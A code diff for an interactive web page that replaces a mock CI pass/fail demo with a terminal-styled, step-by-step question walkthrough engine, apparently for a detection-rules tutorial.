-  var ciTest = document.getElementById('ci-test'), ciFails = document.getElementById('ci-fails'), merge = document.getElementById('merge'), ciMsg = document.getElementById('ci-msg');
-  document.getElementById('ci-break').addEventListener('click', function () {
-    ciTest.textContent = '✗'; ciTest.className = 'ic x'; ciFails.classList.add('on');
-    merge.disabled = true; ciMsg.textContent = 'Merging is blocked: 1 of 2 rules failed. The failing events are in the job summary.'; ciMsg.className = 'msg bad';
+  // ---------- engine ----------
+  var host = document.getElementById('steps'), prog = document.getElementById('prog'), fin = document.getElementById('fin');
+  var cur = -1, state = 'idle', activeEl = null, timers = [];
+  var FAST = /[?&]fast/.test(location.search) || window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  function setProg(n) { var f = Math.round((n / STEPS.length) * 10), s = ''; for (var i = 0; i < 10; i++) s += i < f ? '#' : '-'; prog.textContent = '[' + s + '] Q' + n + '/' + STEPS.length; }
+  function clearTimers() { timers.forEach(clearTimeout); timers = []; }
+  function scrollTo(el) { setTimeout(function () { var y = el.getBoundingClientRect().top + window.pageYOffset - 36; window.scrollTo({ top: y, behavior: 'smooth' }); }, 30); }
+
+  function showStep(i) {
+    if (i >= STEPS.length) { fin.classList.remove('hidden'); state = 'done'; setProg(STEPS.length); scrollTo(fin); return; }
+    cur = i; var s = STEPS[i];
+    var el = document.createElement('section'); el.className = 'step'; el.id = 'q' + (i + 1);
+    el.innerHTML = '<p class="q"><small>QUESTION ' + (i + 1) + ' OF ' + STEPS.length + '</small>' + esc(s.q) + '</p>' +
+      '<div class="prompt" tabindex="0"><span class="ps1">reda@soc:~/detforge$</span> <span class="cmd ghost cur">' + esc(s.cmd) + '</span> <span class="hint">[enter] run</span></div>' +
+      '<pre class="out hidden"></pre><div class="menu hidden"></div>';
+    host.appendChild(el); activeEl = el; state = 'ready'; setProg(i + 1);
+    var prompt = el.querySelector('.prompt');
+    prompt.addEventListener('click', function () { runStep(); });
+    prompt.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); e.stopPropagation(); runStep(); } });
+    if (i > 0) scrollTo(el);
+  }
+  function typeOut(pre, html, done) {
+    var lines = html.split('\n'), i = 0; pre.innerHTML = ''; pre.classList.remove('hidden');
+    if (FAST) { pre.innerHTML = html; done && done(); return; }
+    (function next() {
+      if (i >= lines.length) { done && done(); return; }
+      pre.innerHTML = lines.slice(0, i + 1).join('\n'); i++;
+      timers.push(setTimeout(next, 26));
+    })();
+  }
+  function runStep() {
+    if (state !== 'ready' || !activeEl) return;
+    state = 'running';
+    var s = STEPS[cur], cmdEl = activeEl.querySelector('.cmd'), hint = activeEl.querySelector('.hint'), pre = activeEl.querySelector('.out');
+    hint.textContent = '';
+    var text = s.cmd, n = 0; cmdEl.textContent = ''; cmdEl.classList.remove('ghost');
+    if (FAST) {
+      cmdEl.textContent = text; cmdEl.classList.remove('cur');
+      typeOut(pre, typeof s.out === 'function' ? s.out() : s.out, function () { afterOutput(s); });
+      return;
+    }
+    (function type() {
+      if (n <= text.length) { cmdEl.textContent = text.slice(0, n); n++; timers.push(setTimeout(type, 22)); return; }
+      cmdEl.classList.remove('cur');
+      var html = typeof s.out === 'function' ? s.out() : s.out;
+      typeOut(pre, html, function () { afterOutput(s); });
+    })();
+  }
+  function afterOutput(s) {
+    var menu = activeEl.querySelector('.menu');
+    if (s.menu) {
+      menu.classList.remove('hidden');
+      menu.innerHTML = '<span class="lbl">choose:</span>' + s.menu.map(function (m) { return '<button data-k="' + m.k + '"><b>[' + m.k + ']</b> ' + esc(m.label) + '</button>'; }).join('');
+      menu.querySelectorAll('button').forEach(function (b) { b.addEventListener('click', function () { choose(b.getAttribute('data-k')); }); });
+    }
+    activeEl.querySelectorAll('.yaml .part').forEach(function (p) { p.addEventListener('click', function () { choose(p.getAttribute('data-x')); }); });
+    var next = document.createElement('a'); next.className = 'next'; next.href = '#';
+    next.innerHTML = '<span class="arrow">▼</span>' + (cur + 1 < STEPS.length ? 'next: question ' + (cur + 2) + ' of ' + STEPS.length + '   [↓]' : 'the end   [↓]');
+    next.addEventListener('click', function (e) { e.preventDefault(); advance(); });
+    activeEl.appendChild(next); state = 'open';
+  }
+  function choose(k) {
+    if (state !== 'open' || !activeEl) return;
+    var s = STEPS[cur], m = (s.menu || []).filter(function (x) { return x.k === k; })[0];
+    if (!m) return;
+    activeEl.querySelectorAll('.menu button').forEach(function (b) { b.classList.toggle('on', b.getAttribute('data-k') === k); });
+    activeEl.querySelectorAll('.yaml .part').forEach(function (p) { p.classList.toggle('on', p.getAttribute('data-x') === k); });
+    var extra = activeEl.querySelector('.extra');
+    if (!extra) { extra = document.createElement('pre'); extra.className = 'out extra'; activeEl.querySelector('.menu').insertAdjacentElement('afterend', extra); }
+    extra.innerHTML = ''; state = 'running'; clearTimers();
+    typeOut(extra, m.run(), function () { state = 'open'; });
+  }
+  function advance() { if (state !== 'open') return; activeEl.querySelector('.next').classList.add('hidden'); showStep(cur + 1); }
+  function restart() { clearTimers(); host.innerHTML = ''; fin.classList.add('hidden'); cur = -1; state = 'idle'; window.scrollTo(0, 0); showStep(0); }
+
+  document.addEventListener('keydown', function (e) {
+    if (e.target && /INPUT|TEXTAREA/.test(e.target.tagName)) return;
+    if (e.key === 'Enter') { e.preventDefault(); if (state === 'ready') runStep(); else if (state === 'open') advance(); }
+    else if (e.key === 'ArrowDown' && state === 'open') { e.preventDefault(); advance(); }
+    else if (/^[1-9]$/.test(e.key)) { choose(e.key); }
+    else if (e.key === 'r' || e.key === 'R') { restart(); }
   });
-  document.getElementById('ci-fix').addEventListener('click', function () {
-    ciTest.textContent = '✓'; ciTest.className = 'ic'; ciFails.classList.remove('on');
-    merge.disabled = false; ciMsg.textContent = 'All checks have passed.'; ciMsg.className = 'msg';
-  });
-  merge.addEventListener('click', function () { ciMsg.textContent = 'Merged. The rule is live with its tests beside it.'; merge.disabled = true; });
+  document.getElementById('restart').addEventListener('click', function (e) { e.preventDefault(); restart(); });
+  showStep(0);
 })();
 </script>
 </body>
